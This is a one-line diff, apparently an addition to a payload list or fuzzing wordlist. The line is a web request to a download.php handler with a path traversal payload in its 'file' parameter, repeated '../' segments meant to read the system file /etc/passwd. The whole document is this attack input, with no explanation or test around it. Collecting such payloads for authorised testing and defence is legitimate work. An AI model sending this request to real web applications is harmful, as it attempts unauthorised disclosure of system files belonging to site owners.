@@ -1,0 +1,1 @@
+/download.php?c_id=557&file=../../../../../../../../../../../etc/passwd&name=download.txt
